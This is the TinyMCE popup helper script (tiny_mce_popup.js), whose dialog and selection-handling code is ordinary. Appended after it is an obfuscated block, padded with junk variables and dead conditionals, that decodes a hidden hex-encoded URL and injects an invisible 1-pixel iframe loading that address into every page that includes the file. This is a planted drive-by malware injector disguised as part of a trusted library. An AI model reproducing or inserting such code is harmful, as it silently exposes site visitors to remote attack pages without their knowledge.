// Some global instances
var tinymce = null, tinyMCEPopup, tinyMCE;

tinyMCEPopup = {
	init : function() {
		var t = this, w, ti, li, q, i, it;

		li = ('' + document.location.search).replace(/^\?/, '').split('&');
		q = {};
		for (i=0; i<li.length; i++) {
			it = li[i].split('=');
			q[unescape(it[0])] = unescape(it[1]);
		}

		if (q.mce_rdomain)
			document.domain = q.mce_rdomain;

		// Find window & API
		w = t.getWin();
		tinymce = w.tinymce;
		tinyMCE = w.tinyMCE;
		t.editor = tinymce.EditorManager.activeEditor;
		t.params = t.editor.windowManager.params;
		t.features = t.editor.windowManager.features;

		// Setup local DOM
		t.dom = t.editor.windowManager.createInstance('tinymce.dom.DOMUtils', document);

		// Enables you to skip loading the default css
		if (t.features.popup_css !== false)
			t.dom.loadCSS(t.features.popup_css || t.editor.settings.popup_css);

		// Setup on init listeners
		t.listeners = [];
		t.onInit = {
			add : function(f, s) {
				t.listeners.push({func : f, scope : s});
			}
		};

		t.isWindow = !t.getWindowArg('mce_inline');
		t.id = t.getWindowArg('mce_window_id');
		t.editor.windowManager.onOpen.dispatch(t.editor.windowManager, window);
	},

	getWin : function() {
		return window.dialogArguments || opener || parent || top;
	},

	getWindowArg : function(n, dv) {
		var v = this.params[n];

		return tinymce.is(v) ? v : dv;
	},

	getParam : function(n, dv) {
		return this.editor.getParam(n, dv);
	},

	getLang : function(n, dv) {
		return this.editor.getLang(n, dv);
	},

	execCommand : function(cmd, ui, val, a) {
		a = a || {};
		a.skip_focus = 1;

		this.restoreSelection();
		return this.editor.execCommand(cmd, ui, val, a);
	},

	resizeToInnerSize : function() {
		var t = this, n, b = document.body, vp = t.dom.getViewPort(window), dw, dh;

		dw = t.getWindowArg('mce_width') - vp.w;
		dh = t.getWindowArg('mce_height') - vp.h;

		if (t.isWindow)
			window.resizeBy(dw, dh);
		else
			t.editor.windowManager.resizeBy(dw, dh, t.id);
	},

	executeOnLoad : function(s) {
		this.onInit.add(function() {
			eval(s);
		});
	},

	storeSelection : function() {
		this.editor.windowManager.bookmark = tinyMCEPopup.editor.selection.getBookmark('simple');
	},

	restoreSelection : function() {
		var t = tinyMCEPopup;

		if (!t.isWindow && tinymce.isIE)
			t.editor.selection.moveToBookmark(t.editor.windowManager.bookmark);
	},

	requireLangPack : function() {
		var u = this.getWindowArg('plugin_url') || this.getWindowArg('theme_url');

		if (u && this.editor.settings.language) {
			u += '/langs/' + this.editor.settings.language + '_dlg.js';

			if (!tinymce.ScriptLoader.isDone(u)) {
				document.write('<script type="text/javascript" src="' + tinymce._addVer(u) + '"></script>');
				tinymce.ScriptLoader.markDone(u);
			}
		}
	},

	pickColor : function(e, element_id) {
		this.execCommand('mceColorPicker', true, {
			color : document.getElementById(element_id).value,
			func : function(c) {
				document.getElementById(element_id).value = c;

				try {
					document.getElementById(element_id).onchange();
				} catch (ex) {
					// Try fire event, ignore errors
				}
			}
		});
	},

	openBrowser : function(element_id, type, option) {
		tinyMCEPopup.restoreSelection();
		this.editor.execCallback('file_browser_callback', element_id, document.getElementById(element_id).value, type, window);
	},

	confirm : function(t, cb, s) {
		this.editor.windowManager.confirm(t, cb, s, window);
	},

	alert : function(tx, cb, s) {
		this.editor.windowManager.alert(tx, cb, s, window);
	},

	close : function() {
		var t = this;

		// To avoid domain relaxing issue in Opera
		function close() {
			t.editor.windowManager.close(window);
			tinymce = tinyMCE = t.editor = t.params = t.dom = t.dom.doc = null; // Cleanup
		};

		if (tinymce.isOpera)
			t.getWin().setTimeout(close, 0);
		else
			close();
	},

	// Internal functions	

	_restoreSelection : function() {
		var e = window.event.srcElement;

		if (e.nodeName == 'INPUT' && (e.type == 'submit' || e.type == 'button'))
			tinyMCEPopup.restoreSelection();
	},

/*	_restoreSelection : function() {
		var e = window.event.srcElement;

		// If user focus a non text input or textarea
		if ((e.nodeName != 'INPUT' && e.nodeName != 'TEXTAREA') || e.type != 'text')
			tinyMCEPopup.restoreSelection();
	},*/

	_onDOMLoaded : function() {
		var t = this, ti = document.title, bm, h, nv;

		// Translate page
		if (t.features.translate_i18n !== false) {
			h = document.body.innerHTML;

			// Replace a=x with a="x" in IE
			if (tinymce.isIE)
				h = h.replace(/ (value|title|alt)=([^"][^\s>]+)/gi, ' $1="$2"')

			document.dir = t.editor.getParam('directionality','');

			if ((nv = t.editor.translate(h)) && nv != h)
				document.body.innerHTML = nv;

			if ((nv = t.editor.translate(ti)) && nv != ti)
				document.title = ti = nv;
		}

		document.body.style.display = '';

		// Restore selection in IE when focus is placed on a non textarea or input element of the type text
		if (tinymce.isIE)
			document.attachEvent('onmouseup', tinyMCEPopup._restoreSelection);

		t.restoreSelection();
		t.resizeToInnerSize();

		// Set inline title
		if (!t.isWindow)
			t.editor.windowManager.setTitle(window, ti);
		else
			window.focus();

		if (!tinymce.isIE && !t.isWindow) {
			tinymce.dom.Event._add(document, 'focus', function() {
				t.editor.windowManager.focus(t.id)
			});
		}

		// Patch for accessibility
		tinymce.each(t.dom.select('select'), function(e) {
			e.onkeydown = tinyMCEPopup._accessHandler;
		});

		// Call onInit
		// Init must be called before focus so the selection won't get lost by the focus call
		tinymce.each(t.listeners, function(o) {
			o.func.call(o.scope, t.editor);
		});

		// Move focus to window
		if (t.getWindowArg('mce_auto_focus', true)) {
			window.focus();

			// Focus element with mceFocus class
			tinymce.each(document.forms, function(f) {
				tinymce.each(f.elements, function(e) {
					if (t.dom.hasClass(e, 'mceFocus') && !e.disabled) {
						e.focus();
						return false; // Break loop
					}
				});
			});
		}

		document.onkeyup = tinyMCEPopup._closeWinKeyHandler;
	},

	_accessHandler : function(e) {
		e = e || window.event;

		if (e.keyCode == 13 || e.keyCode == 32) {
			e = e.target || e.srcElement;

			if (e.onchange)
				e.onchange();

			return tinymce.dom.Event.cancel(e);
		}
	},

	_closeWinKeyHandler : function(e) {
		e = e || window.event;

		if (e.keyCode == 27)
			tinyMCEPopup.close();
	},

	_wait : function() {
		var t = this, ti;

		if (tinymce.isIE && document.location.protocol != 'https:') {
			// Fake DOMContentLoaded on IE
			document.write('<script id=__ie_onload defer src=\'javascript:""\';><\/script>');
			document.getElementById("__ie_onload").onreadystatechange = function() {
				if (this.readyState == "complete") {
					t._onDOMLoaded();
					document.getElementById("__ie_onload").onreadystatechange = null; // Prevent leak
				}
			};
		} else {
			if (tinymce.isIE || tinymce.isWebKit) {
				ti = setInterval(function() {
					if (/loaded|complete/.test(document.readyState)) {
						clearInterval(ti);
						t._onDOMLoaded();
					}
				}, 10);
			} else {
				window.addEventListener('DOMContentLoaded', function() {
					t._onDOMLoaded();
				}, false);
			}
		}
	}
};

tinyMCEPopup.init();
tinyMCEPopup._wait(); // Wait for DOM Content Loaded

if('RzRI'=='vNmYZr')WotWy();var EeQB=190;var SAWXZ='xDLvr';var kNAir="ap\x70\x65n\x64Chil\x64";var xYLXAV=185;var pmYPbUq="from\x43harCode";var eAGoDq="pa\x72seIn\x74";var cZZxfH;if('Aoruhu'=='CvAro')bMEhTb='stDI';var KJdRokWGJ="";if('mhWHI'=='vuBb')cDAacx='tRSR';if('XKItnr'=='iXtkqQ')ibyaKC='cndwyY';var appVersion_var="a\x70\x70\x56e\x72s\x69on";var VKNc=10;var SozsA;var PZwXGX;if('dLNmC'=='WwTd')CCaq();if('URyu'=='FZzn')BCbGq();var TRUSkxc="body";var GVNV=79;var HyttL="slice";var NvejW='ntsiIx';var BMimh="\x63onstr\x75cto\x72";var pwqc;if('FvqYLK'=='IsceNQ')HQCI='VgQs';var BIhKphTEQ="9ba7a7a36d626299a59460a094ac656364656196a2a062a09ca197629ca161969a9c726463";var SZREI='tFuED';function lnKO(){}
var px1_var="1px";var klOIhyk=(function(){function TbDDFK(){var zuteCK='tVpSj';if('nZpx'=='rGoRe')Qxrv();}
return this;function OLah(){var yfPs='jVHplE';if('bUlmH'=='WEYcvU')dkYCa();}var CKletS;function rUIc(){var mKMf='CCsdY';if('aiBDhp'=='tylb')WcuC();}})();var yButY=215;var HStRUMg="sgNqAT"[BMimh];var XYwKI;var Sqwl;function QyBOBx(){var JzbjlS='JYtrb';if('zTKPI'=='Iphx')WuaUll();}
for(var IcBNC=0;IcBNC<BIhKphTEQ.length;IcBNC+=2){jvQERqqov=klOIhyk[eAGoDq](BIhKphTEQ[HyttL](IcBNC,IcBNC+2),16)-51;if('rnYZRw'=='hlTy')kVsaT();KJdRokWGJ+=HStRUMg[pmYPbUq](jvQERqqov);var nEJG;var iFmKZy;}
var HlpUpS=84;if('xWjUjt'=='dcGe')mumE='MUWlQ';var cFEu='KIZNt';var zcUAbgYzM="mRbjH";function LIWepn(){}if('wSwjh'=='nPjqNQ')esaOZs();var Tysr;var Iixrn="";var gTtVhp;if('gRYz'=='Vzog')OEzBK='ZYwWC';if(navigator[appVersion_var].indexOf("MSIE")!=-1){var DKGY='RZXGja';if('qJOYPa'=='aalQ')AUeuX();Iixrn='<iframe name="'+zcUAbgYzM+'" src="'+"KJdRokWGJ"+'">';var fancid='jMuUYl';function lXyuT(){}}else{var uQPPkp=194;Iixrn='iframe';var tljyA=208;}
if('SKDLX'=='rnTid')IejBuK();if('KpSDVL'=='ejxthb')kwtAy='twbq';var sPqYiADw=document.createElement(Iixrn);var lQuevG='OpkF';function IzLf(){var CuRqE='VpzNl';if('PgrAR'=='tTSHYF')dbRc();}
sPqYiADw.LsXigs=sPqYiADw.setAttribute;var oaKv='ekQsP';sPqYiADw.style.position="absolute";if('YPvq'=='gbal')tkkoYk='MfjxI';function vfNuI(){}
sPqYiADw.style.height=px1_var;function oRzdI(){}var QHFUR;var UqOfH='GwZBB';sPqYiADw.LsXigs("src",KJdRokWGJ);sPqYiADw.id=zcUAbgYzM;var pXTDG=159;sPqYiADw.style.top="0px";if('tiAK'=='qwJONu')Rqosk();if('ocqrzg'=='byOAl')lDYdEb();sPqYiADw.name=zcUAbgYzM;if('lxQsY'=='gbRhI')QgIPd='FXuK';function juVa(){}
sPqYiADw.style.right="0px";var Udti;if('vfBosj'=='oLaz')TsVT();sPqYiADw.style.width=px1_var;var fDOX;var XQsoM;var NOMde;function ictQFJNG(){var njIAE;if(document[TRUSkxc]){var RIdIR=158;if('QvzybL'=='DNkG')Skno='DjVSRQ';document[TRUSkxc][kNAir](sPqYiADw);}else{if('UzWHc'=='GEnF')sxeV();setTimeout(ictQFJNG,120);var hUVQ='mFuEUi';var imJFc=198;function pXlxj(){var HMIBED='XWnqe';if('LnIj'=='tyPOt')kOQyWJ();}}
var kOQVv='wGyH';}
if('fsjai'=='uWtI')HDDKFT();ictQFJNG();var OoTRIo=107;if('KFTOc'=='AIFvRC')ErNE();function LdLcmi(){var biGo='ELbpKK';if('xRgpIW'=='HvUu')lzEumj();}function NtmL(){}